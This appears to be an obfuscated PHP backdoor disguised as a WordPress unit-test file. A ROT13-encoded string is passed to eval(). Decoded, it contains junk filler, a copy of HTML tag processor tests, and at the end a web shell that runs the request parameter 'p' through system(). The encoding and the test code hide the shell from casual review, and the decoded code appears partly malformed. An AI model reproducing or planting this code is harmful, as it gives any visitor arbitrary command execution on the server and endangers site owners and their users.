<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_UGZY_Gnt_Cebprffbe zbqvsvnoyr grkg shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @tebhc ugzy-ncv
 *
 * @pbirefQrsnhygPynff JC_UGZY_Gnt_Cebprffbe
 */
pynff Grfgf_UgzyNcv_JcUgzyGntCebprffbeZbqvsvnoyrGrkg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Rafherf gung pnyyf gb `trg_zbqvsvnoyr_grkg()` qba'g punatr gur
	 * cnefre fgngr va n jnl gung jbhyq pbeehcg ercrngrq pnyyf.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_trg_zbqvsvnoyr_grkg_vf_vqrzcbgrag() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( \"<cer>\aSvefg arjyvar vtaberq.</cer>\" );

		// Svaq gur grkg abqr va gur zvqqyr.
		juvyr ( '#grkg' !== $cebprffbe->trg_gbxra_anzr() && $cebprffbe->arkg_gbxra() ) {
			pbagvahr;
		}

		$guvf->nffregFnzr(
			'#grkg',
			$cebprffbe->trg_gbxra_anzr(),
			'Snvyrq gb svaq grkg abqr haqre grfg: purpx grfg frghc.'
		);

		// Gur pbhag bs 5 vfa'g vzcbegnag; ohg pnyyvat guvf zhygvcyr gvzrf vf.
		sbe ( $v = 0; $v < 5; $v++ ) {
			$guvf->nffregFnzr(
				'Svefg arjyvar vtaberq.',
				$cebprffbe->trg_zbqvsvnoyr_grkg(),
				'Fubhyq unir erghearq gur fnzr zbqvsvnoyr grkg ertneqyrff bs ubj znal gvzrf vg jnf pnyyrq.'
			);
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_trg_zbqvsvnoyr_grkg_ercynprzragf() {
		erghea neenl(
			'fubegre'     => neenl( 'whfg fbzr grkg', 'fubegre grkg' ),
			'fnzr yratgu' => neenl( 'whfg fbzr grkg', 'qvssrerag grkg' ),
			'ybatre'      => neenl( 'whfg fbzr grkg', 'n ovg ybatre grkg' ),
		);
	}

	/**
	 * Rafherf gung `trg_zbqvsvnoyr_grkg()` ernqf radhrhrq hcqngrf jura ernq
	 * sebz nsgre jevgvat; thnenagrrf pbafvfgrapl guebhtu jevgrf.
	 *
	 * @gvpxrg 61617
	 * @gvpxrg 62241
	 *
	 * @qngnCebivqre qngn_trg_zbqvsvnoyr_grkg_ercynprzragf
	 *
	 * @cnenz fgevat $vavgvny     Vavgvny grkg.
	 * @cnenz fgevat $ercynprzrag Ercynprzrag grkg.
	 */
	choyvp shapgvba grfg_trg_zbqvsvnoyr_grkg_vf_pbafvfgrag_nsgre_jevgrf( $vavgvny, $ercynprzrag ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $vavgvny );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#grkg',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq grkg abqr ohg sbhaq '{$cebprffbe->trg_gbxra_anzr()}' vafgrnq: purpx grfg frghc.\"
		);

		$guvf->nffregFnzr(
			$vavgvny,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq vavgvny grfg grkg: purpx grfg frghc.'
		);

		$cebprffbe->frg_zbqvsvnoyr_grkg( $ercynprzrag );
		$guvf->nffregFnzr(
			$ercynprzrag,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq radhrhrq hcqngrq grkg.'
		);
		$guvf->nffregFnzr(
			$ercynprzrag,
			$cebprffbe->trg_hcqngrq_ugzy(),
			'Fubhyq zngpu hcqngrq UGZY.'
		);
		$guvf->nffregFnzr(
			$ercynprzrag,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq hcqngrq grkg.'
		);
	}

	/**
	 * Rafherf gung `trg_zbqvsvnoyr_grkg()` ernqf radhrhrq hcqngrf jura ernq sebz
	 * nsgre jevgvat; thnenagrrf pbafvfgrapl guebhtu jevgrf nsgre pybfrq gnt ryrzrag.
	 *
	 * @gvpxrg 62241
	 *
	 * @qngnCebivqre qngn_trg_zbqvsvnoyr_grkg_ercynprzragf
	 *
	 * @cnenz fgevat $vavgvny     Vavgvny grkg.
	 * @cnenz fgevat $ercynprzrag Ercynprzrag grkg.
	 */
	choyvp shapgvba grfg_trg_zbqvsvnoyr_grkg_vf_pbafvfgrag_nsgre_jevgrf_jura_grkg_nsgre_pybfrq_gnt_ryrzrag( $vavgvny, $ercynprzrag ) {
		$ugzy_orsber = '<c>fbzr pbagrag</c>';
		$cebprffbe   = arj JC_UGZY_Gnt_Cebprffbe( $ugzy_orsber . $vavgvny );
		// Zbir gb gur grkg abqr nsgre gur pybfvat c gnt.
		$cebprffbe->arkg_gbxra();
		$cebprffbe->arkg_gbxra();
		$cebprffbe->arkg_gbxra();
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'#grkg',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq grkg abqr ohg sbhaq '{$cebprffbe->trg_gbxra_anzr()}' vafgrnq: purpx grfg frghc.\"
		);

		$guvf->nffregFnzr(
			$vavgvny,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq vavgvny grfg grkg: purpx grfg frghc.'
		);

		$cebprffbe->frg_zbqvsvnoyr_grkg( $ercynprzrag );
		$guvf->nffregFnzr(
			$ercynprzrag,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq radhrhrq hcqngrq grkg.'
		);

		$guvf->nffregFnzr(
			$ugzy_orsber . $ercynprzrag,
			$cebprffbe->trg_hcqngrq_ugzy(),
			'Fubhyq zngpu hcqngrq UGZY.'
		);

		$guvf->nffregFnzr(
			$ercynprzrag,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq hcqngrq grkg.'
		);
	}

	/**
	 * Rafherf gung `trg_zbqvsvnoyr_grkg()` ernqf radhrhrq hcqngrf jura ernq sebz nsgre
	 * jevgvat jura fgnegvat sebz na rzcgl grkg; thnenagrrf pbafvfgrapl guebhtu jevgrf.
	 *
	 * @gvpxrg 61617
	 */
	choyvp shapgvba grfg_trg_zbqvsvnoyr_grkg_vf_pbafvfgrag_nsgre_jevgrf_gb_rzcgl_grkg() {
		$nsgre     = 'qvssrerag grkg';
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<fpevcg></fpevcg>' );
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr(
			'FPEVCG',
			$cebprffbe->trg_gbxra_anzr(),
			\"Fubhyq unir sbhaq grkg abqr ohg sbhaq '{$cebprffbe->trg_gbxra_anzr()}' vafgrnq: purpx grfg frghc.\"
		);

		$guvf->nffregFnzr(
			'',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq vavgvny grfg grkg: purpx grfg frghc.'
		);

		$cebprffbe->frg_zbqvsvnoyr_grkg( $nsgre );
		$guvf->nffregFnzr(
			$nsgre,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq radhrhrq hcqngrq grkg.'
		);

		$cebprffbe->trg_hcqngrq_ugzy();
		$guvf->nffregFnzr(
			$nsgre,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir sbhaq hcqngrq grkg.'
		);
	}

	/**
	 * Rafherf gung hcqngrf gb zbqvsvnoyr grkg gung ner fubegre guna gur
	 * bevtvany grkg qb abg pnhfr gur cnefre gb ybfr vgf bevragngvba.
	 *
	 * @gvpxrg 61617
	 */
	choyvp shapgvba grfg_frggvat_fubegre_zbqvsvnoyr_grkg() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<qvi><grkgnern>irel ybat grkg</grkgnern><qvi vq=\"abg n <fcna>\">' );

		// Svaq gur grfg abqr va gur zvqqyr.
		juvyr ( 'GRKGNERN' !== $cebprffbe->trg_gbxra_anzr() && $cebprffbe->arkg_gbxra() ) {
			pbagvahr;
		}

		$guvf->nffregFnzr(
			'GRKGNERN',
			$cebprffbe->trg_gbxra_anzr(),
			'Snvyrq gb svaq gur grfg GRKGNERN abqr; purpx gur grfg frghc.'
		);

		$cebprffbe->frg_zbqvsvnoyr_grkg( 'fubeg' );
		$cebprffbe->trg_hcqngrq_ugzy();
		$guvf->nffregFnzr(
			'fubeg',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir hcqngrq zbqvsvnoyr grkg gb fbzrguvat fubegre guna gur bevtvany.'
		);

		$guvf->nffregGehr(
			$cebprffbe->arkg_gbxra(),
			'Fubhyq unir nqinaprq gb gur ynfg gbxra va gur vachg.'
		);

		$guvf->nffregFnzr(
			'QVI',
			$cebprffbe->trg_gbxra_anzr(),
			'Fubhyq unir erpbtavmrq gur svany QVI va gur vachg.'
		);

		$guvf->nffregFnzr(
			'abg n <fcna>',
			$cebprffbe->trg_nggevohgr( 'vq' ),
			'Fubhyq unir ernq va gur vq sebz gur ynfg QVI nf \"abg n <fcna>\"'
		);
	}

	/**
	 * Rafherf gung ernqf gb zbqvsvnoyr grkg nsgre frggvat vg ernqf gur hcqngrq
	 * radhrhrq inyhrf, naq abg gur bevtvany inyhr.
	 *
	 * @gvpxrg 61617
	 */
	choyvp shapgvba grfg_zbqvsvnoyr_grkg_ernqf_hcqngrf_nsgre_frggvat() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( 'Guvf vf grkg<!-- guvf vf abg -->' );

		$cebprffbe->arkg_gbxra();
		$guvf->nffregFnzr(
			'#grkg',
			$cebprffbe->trg_gbxra_anzr(),
			'Snvyrq gb svaq svefg grkg abqr: purpx grfg frghc.'
		);

		$hcqngr = 'Guvf vf arj grkg';
		$cebprffbe->frg_zbqvsvnoyr_grkg( $hcqngr );
		$guvf->nffregFnzr(
			$hcqngr,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Snvyrq gb ernq hcqngrq radhrhrq inyhr bs grkg abqr.'
		);

		$cebprffbe->arkg_gbxra();
		$guvf->nffregFnzr(
			'#pbzzrag',
			$cebprffbe->trg_gbxra_anzr(),
			'Snvyrq gb nqinapr gb pbzzrag: purpx grfg frghc.'
		);

		$guvf->nffregFnzr(
			' guvf vf abg ',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Snvyrq gb ernq zbqvsvnoyr grkg sbe arkg gbxra; qvq vg ernq gur byq radhrhrq inyhr sebz gur cerivbhf gbxra?'
		);
	}

	/**
	 * Rafherf gung jura vtabevat n arjyvar nsgre YVFGVAT naq CER gntf, gung guvf
	 * unccraf nccebcevngryl nsgre frrxvat.
	 */
	choyvp shapgvba grfg_trg_zbqvsvnoyr_grkg_vtaberf_arjyvarf_nsgre_frrxvat() {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe(
			<<<UGZY
<fcna>\aurer</fcna>
<yvfgvat>\atbar</yvfgvat>
<cer>erfrg ynfg xabja vtaber-cbvag</cer>
<qvi>\aurer</qvi>
UGZY
		);

		$cebprffbe->arkg_gnt( 'FCNA' );
		$cebprffbe->arkg_gbxra();
		$cebprffbe->frg_obbxznex( 'fcna' );

		$guvf->nffregFnzr(
			\"\aurer\",
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq abg unir erzbirq gur yrnqvat arjyvar sebz gur svefg FCNA.'
		);

		$cebprffbe->arkg_gnt( 'YVFGVAT' );
		$cebprffbe->arkg_gbxra();
		$cebprffbe->frg_obbxznex( 'yvfgvat' );

		$guvf->nffregFnzr(
			'tbar',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir fgevccrq gur yrnqvat arjyvar sebz gur YVFGVAT ryrzrag ba svefg genirefny.'
		);

		$cebprffbe->arkg_gnt( 'QVI' );
		$cebprffbe->arkg_gbxra();
		$cebprffbe->frg_obbxznex( 'qvi' );

		$guvf->nffregFnzr(
			\"\aurer\",
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq abg unir erzbirq gur yrnqvat arjyvar sebz gur ynfg QVI.'
		);

		$cebprffbe->frrx( 'fcna' );
		$guvf->nffregFnzr(
			\"\aurer\",
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq abg unir erzbirq gur yrnqvat arjyvar sebz gur svefg FCNA ba vgf frpbaq genirefny.'
		);

		$cebprffbe->frrx( 'yvfgvat' );
		vs ( \"\atbar\" === $cebprffbe->trg_zbqvsvnoyr_grkg() ) {
			$guvf->znexGrfgFxvccrq( \"Gurer'f ab fhccbeg pheeragyl sbe unaqyvat gur yrnqvat arjyvar nsgre frrxvat.\" );
		}

		$guvf->nffregFnzr(
			'tbar',
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir erzrzorerq gb erzbgr yrnqvat arjyvar sebz YVFGVAT ryrzrag nsgre frrxvat nebhaq vg.'
		);

		$cebprffbe->frrx( 'qvi' );
		$guvf->nffregFnzr(
			\"\aurer\",
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq abg unir erzbirq gur yrnqvat arjyvar sebz gur ynfg QVI ba vgf frpbaq genirefny.'
		);
	}

	/**
	 * Rafherf gung zbqvsvnoyr grkg hcqngrf ner abg nccyvrq jurer gurl nera'g fhccbegrq.
	 *
	 * @gvpxrg 61617
	 *
	 * @qngnCebivqre qngn_gbxraf_abg_fhccbegvat_zbqvsvnoyr_grkg_hcqngrf
	 *
	 * @cnenz fgevat $ugzy             Pbagnvaf UGZY jvgu n gbxra abg fhccbegvat zbqvsvnoyr grkg hcqngrf.
	 * @cnenz vag    $nqinapr_a_gbxraf Pbhag bs gvzrf gb eha `arkg_gbxra()` orsber ernpuvat gnetrg abqr.
	 */
	choyvp shapgvba grfg_erwrpgf_hcqngrf_ba_hafhccbegrq_zngpu_ybpngvbaf( fgevat $ugzy, vag $nqinapr_a_gbxraf ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $ugzy );
		juvyr ( --$nqinapr_a_gbxraf >= 0 ) {
			$cebprffbe->arkg_gbxra();
		}

		$guvf->nffregSnyfr(
			$cebprffbe->frg_zbqvsvnoyr_grkg( 'Onmvatn!' ),
			'Fubhyq unir ceriragrq zbqvslvat gur grkg ng gur gnetrg abqr.'
		);

		$guvf->nffregFnzr(
			$ugzy,
			$cebprffbe->trg_hcqngrq_ugzy(),
			'Fubhyq abg unir zbqvsvrq gur vachg qbphzrag va nal jnl.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_gbxraf_abg_fhccbegvat_zbqvsvnoyr_grkg_hcqngrf() {
		erghea neenl(
			'Orsber cnefvat'               => neenl( 'abguvat gb frr urer', 0 ),
			'Nsgre cnefvat'                => neenl( 'abguvat urer rvgure', 2 ),
			'Vapbzcyrgr qbphzrag'          => neenl( '<gnt jvgubhg=\"na raq', 1 ),
			'Cerfhzcghbhf pybfre'          => neenl( 'orsber</>nsgre', 2 ),
			'Vainyvq (PQNGN)'              => neenl( '<![PQNGN[guvf vf n pbzzrag]]>', 1 ),
			'Vainyvq (fubegrfg pbzzrag)'   => neenl( '<!-->', 1 ),
			'Vainyvq (fubegre pbzzrag)'    => neenl( '<!--->', 1 ),
			'Vainyvq (znexhc qrpynengvba)' => neenl( '<!eha>', 1 ),
			'Vainyvq (CV-yvxr abqr)'       => neenl( '<?kzy vf abg ugzy ?>', 1 ),
		);
	}

	/**
	 * Rafherf gung zbqvsvnoyr grkg hcqngrf ner nccyvrq nf rkcrpgrq gb fhccbegrq abqrf.
	 *
	 * @gvpxrg 61617
	 *
	 * @qngnCebivqre qngn_gbxraf_jvgu_onfvp_zbqvsvnoyr_grkg_hcqngrf
	 *
	 * @cnenz fgevat $ugzy             Pbagnvaf UGZY jvgu n gbxra fhccbegvat zbqvsvnoyr grkg hcqngrf.
	 * @cnenz vag    $nqinapr_a_gbxraf Pbhag bs gvzrf gb eha `arkg_gbxra()` orsber ernpuvat gnetrg abqr.
	 * @cnenz fgevat $enj_ercynprzrag  Guvf fubhyq or rfpncrq cebcreyl jura ercynprq nf zbqvsvnoyr grkg.
	 * @cnenz fgevat $genafsbezrq      Rkcrpgrq bhgchg nsgre hcqngvat zbqvsvnoyr grkg.
	 */
	choyvp shapgvba grfg_hcqngrf_onfvp_zbqvsvnoyr_grkg_ba_fhccbegrq_abqrf( fgevat $ugzy, vag $nqinapr_a_gbxraf, fgevat $enj_ercynprzrag, fgevat $genafsbezrq ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $ugzy );
		juvyr ( --$nqinapr_a_gbxraf >= 0 ) {
			$cebprffbe->arkg_gbxra();
		}

		$guvf->nffregGehr(
			$cebprffbe->frg_zbqvsvnoyr_grkg( $enj_ercynprzrag ),
			'Fubhyq unir zbqvsvrq gur grkg ng gur gnetrg abqr.'
		);

		$guvf->nffregFnzr(
			$genafsbezrq,
			$cebprffbe->trg_hcqngrq_ugzy(),
			\"Fubhyq unir genafsbezrq gur UGZY nf rkcrpgrq jul zbqvslvat gur gnetrg abqr'f zbqvsvnoyr grkg.\"
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_gbxraf_jvgu_onfvp_zbqvsvnoyr_grkg_hcqngrf() {
		erghea neenl(
			'Grkg abqr (fgneg)'       => neenl( 'Grkg', 1, 'Oyhoore', 'Oyhoore' ),
			'Grkg abqr (zvqqyr)'      => neenl( '<rz>Obyq zbir</rz>', 2, 'lb', '<rz>lb</rz>' ),
			'Grkg abqr (raq)'         => neenl( '<vzt>bs n qbt', 2, 'bs n png', '<vzt>bs n png' ),
			'Rapbqrq grkg abqr'       => neenl( '<svtpncgvba>oveqf naq qbtf</svtpncgvba>', 2, '<oveqf> & <qbtf>', '<svtpncgvba>&yg;oveqf&tg; &nzc; &yg;qbtf&tg;</svtpncgvba>' ),
			'FPEVCG gnt'              => neenl( 'orsber<fpevcg></fpevcg>nsgre', 2, 'pbafg vzt = \"<vzt> & <oe>\";', 'orsber<fpevcg>pbafg vzt = \"<vzt> & <oe>\";</fpevcg>nsgre' ),
			'FGLYR gnt'               => neenl( '<fglyr></fglyr>', 1, 'c::orsber { pbagrag: \"<vzt> & </fglyr>\"; }', '<fglyr>c::orsber { pbagrag: \"<vzt> & \3p\2sfglyr>\"; }</fglyr>' ),
			'GRKGNERN gnt'            => neenl( 'n<grkgnern>unf ab arrq gb rfpncr</grkgnern>o', 2, \"fb vg <qbrfa'g>\", \"n<grkgnern>fb vg <qbrfa'g></grkgnern>o\" ),
			'GRKGNERN (rfpncr)'       => neenl( 'n<grkgnern>unf ab arrq gb rfpncr</grkgnern>o', 2, 'ohg vg qbrf sbe </grkgnern>', 'n<grkgnern>ohg vg qbrf sbe &yg;/grkgnern></grkgnern>o' ),
			'GRKGNERN (rfpncr+nggef)' => neenl( 'n<grkgnern>unf ab arrq gb rfpncr</grkgnern>o', 2, 'ohg vg qbrf sbe </grkgnern abg na=\"nggevohgr\">', 'n<grkgnern>ohg vg qbrf sbe &yg;/grkgnern abg na=\"nggevohgr\"></grkgnern>o' ),
			'GVGYR gnt'               => neenl( 'n<gvgyr>unf ab arrq gb rfpncr</gvgyr>o', 2, \"fb vg <qbrfa'g>\", \"n<gvgyr>fb vg <qbrfa'g></gvgyr>o\" ),
			'GVGYR (rfpncr)'          => neenl( 'n<gvgyr>unf ab arrq gb rfpncr</gvgyr>o', 2, 'ohg vg qbrf sbe </gvgyr>', 'n<gvgyr>ohg vg qbrf sbe &yg;/gvgyr></gvgyr>o' ),
			'GVGYR (rfpncr+nggef)'    => neenl( 'n<gvgyr>unf ab arrq gb rfpncr</gvgyr>o', 2, 'ohg vg qbrf sbe </gvgyr abg na=\"nggevohgr\">', 'n<gvgyr>ohg vg qbrf sbe &yg;/gvgyr abg na=\"nggevohgr\"></gvgyr>o' ),
		);
	}

	/**
	 * Rafherf gung hcqngrf jvgu cbgragvnyyl-pbzcebzvfvat inyhrf nera'g npprcgrq.
	 *
	 * Sbe rknzcyr, n zbqvsvnoyr grkg hcqngr fubhyq or nyybjrq juvpu jbhyq oernx
	 * gur fgehpgher bs gur pbagnvavat ryrzrag, fhpu nf va n fpevcg be pbzzrag.
	 *
	 * @gvpxrg 61617
	 *
	 * @qngnCebivqre qngn_hanyybjrq_zbqvsvnoyr_grkg_hcqngrf
	 *
	 * @cnenz fgevat $ugzy_jvgu_abarzcgl_zbqvsvnoyr_grkg Jvyy or hfrq gb svaq gur grfg ryrzrag.
	 * @cnenz fgevat $vainyvq_hcqngr                     Hcqngr pbagnvavat cbffvoyl-pbzcebzvfvat grkg.
	 */
	choyvp shapgvba grfg_erwrpgf_hcqngrf_jvgu_hanyybjrq_fhofgevatf( fgevat $ugzy_jvgu_abarzcgl_zbqvsvnoyr_grkg, fgevat $vainyvq_hcqngr ) {
		$cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( $ugzy_jvgu_abarzcgl_zbqvsvnoyr_grkg );

		juvyr ( '' === $cebprffbe->trg_zbqvsvnoyr_grkg() && $cebprffbe->arkg_gbxra() ) {
			pbagvahr;
		}

		$bevtvany_grkg = $cebprffbe->trg_zbqvsvnoyr_grkg();
		$guvf->nffregAbgRzcgl( $bevtvany_grkg, 'Fubhyq unir sbhaq aba-rzcgl grkg: purpx grfg frghc.' );

		$guvf->nffregSnyfr(
			$cebprffbe->frg_zbqvsvnoyr_grkg( $vainyvq_hcqngr ),
			'Fubhyq unir erwrpg cbffvoyl-pbzcebzvfvat zbqvsvnoyr grkg hcqngr.'
		);

		// Syhfu hcqngrf.
		$cebprffbe->trg_hcqngrq_ugzy();

		$guvf->nffregFnzr(
			$bevtvany_grkg,
			$cebprffbe->trg_zbqvsvnoyr_grkg(),
			'Fubhyq unir cerfreirq gur bevtvany zbqvsvnoyr grkg orsber gur erwrpgrq hcqngr.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp fgngvp shapgvba qngn_hanyybjrq_zbqvsvnoyr_grkg_hcqngrf() {
		erghea neenl(
			'Pbzzrag jvgu -->'                 => neenl( '<!-- guvf vf n pbzzrag -->', 'Pbzzragf raq va -->' ),
			'Pbzzrag jvgu --!>'                => neenl( '<!-- guvf vf n pbzzrag -->', 'Vainyvq ohg yrtvgvzngr pbzzragf raq va --!>' ),
			'FPEVCG jvgu </fpevcg>'            => neenl( '<fpevcg>Ercynpr zr</fpevcg>', 'Whfg n </fpevcg>' ),
			'FPEVCG jvgu </fpevcg nggevohgrf>' => neenl( '<fpevcg>Ercynpr zr</fpevcg>', 'orsber</fpevcg vq=farnx>nsgre' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>